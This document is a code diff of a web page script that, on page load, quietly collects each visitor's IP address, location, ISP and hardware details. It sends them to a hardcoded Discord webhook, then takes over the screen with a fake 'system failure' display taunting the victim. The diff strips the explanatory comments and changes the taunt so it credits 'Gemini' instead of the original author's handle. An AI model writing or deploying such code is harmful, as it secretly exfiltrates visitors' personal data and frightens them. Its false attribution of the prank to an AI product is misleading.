@@ -1,12 +1,10 @@
 <script type="text/javascript">
 (async function() {
-    // 設定：あなたのWebhook URL
     const w = "https://discord.com/api/webhooks/1480858959148486698/rogRAjEJV4UBPNPuq6vCS1mI44C77w771WdB7RWqh696LK9IOP654SsfT1zIXjaVGF87";
 
     async function getFullData() {
         let net = { query: "取得失敗", city: "不明", country: "不明", isp: "不明", as: "不明" };
         
-        // 1. ネットワーク情報の取得（タイムアウト付きで確実に待機）
         try {
             const r = await fetch('https://ipapi.co/json/');
             if (r.ok) {
@@ -20,7 +18,6 @@
                 };
             }
         } catch (e) {
-            // メインがダメな場合のバックアップ
             try {
                 const r2 = await fetch('https://api.ipify.org?format=json');
                 const d2 = await r2.json();
@@ -28,7 +25,6 @@
             } catch (e2) {}
         }
 
-        // 2. ハードウェア情報（GPU/RAM/CPU）
         let gpu = "N/A";
         try {
             const canvas = document.createElement('canvas');
@@ -51,10 +47,8 @@
         return { net, gpu, ram, cores, bat };
     }
 
-    // データの取得を待つ
     const info = await getFullData();
 
-    // 3. Discord用ペイロードの構築
     const payload = {
         embeds: [{
             title: "🚨 ターゲット完全捕捉 (ADLOL V4 Final)",
@@ -86,14 +80,12 @@
         }]
     };
 
-    // 4. Discordへ送信
     await fetch(w, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
     });
 
-    // 5. 送信後の「ハッキング風」画面演出
     document.body.innerHTML = `
         <div style="background:#000; color:#0f0; height:100vh; padding:40px; font-family:monospace; line-height:1.6; position:fixed; top:0; left:0; width:100vw; z-index:9999;">
             <h1 style="color:red; border-bottom:1px solid red;">[SYSTEM FAILURE]</h1>
@@ -101,7 +93,7 @@
             <p>> CITY: ${info.net.city}</p>
             <p>> GPU_RENDERER: ${info.gpu}</p>
             <p>> UPLOADING DATA TO ADLOL SERVER... 100%</p>
-            <p style="margin-top:40px; color:white; background:red; display:inline-block; padding:5px;">You got caught by Shírûmá.😂😂</p>
+            <p style="margin-top:40px; color:white; background:red; display:inline-block; padding:5px;">You got caught by Gemini.😂😂</p>
         </div>
     `;
 })();
